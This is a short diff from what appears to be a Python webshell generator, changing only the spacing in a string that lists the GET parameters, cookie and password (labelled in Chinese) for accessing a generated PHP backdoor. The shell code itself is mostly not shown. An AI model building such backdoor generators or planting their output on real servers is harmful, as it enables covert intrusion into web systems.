@@ -116,6 +116,6 @@ def gen_php_webshell():
     """ + "} " + "?>"
     webshell = webshell.replace('\n', '')
     webshell = webshell.replace('    ', '')
-    setting = "GET参数: " + variables[5] + "[]=2" + "&" + variables[6] + "[]=1\n" + "Cookie: " + cookie_name + "=" + cookie_value + "\n密码: " + f'{p1}[]=2&{p2}[]=1&{passwords}'
+    setting = "GET参数: " + variables[5] + "[]=2" + "&" + variables[6] + "[]=1\n" + "Cookie:  " + cookie_name + "=" + cookie_value + "\n密码:    " + f'{p1}[]=2&{p2}[]=1&{passwords}'
     result = [webshell, setting]
     return result
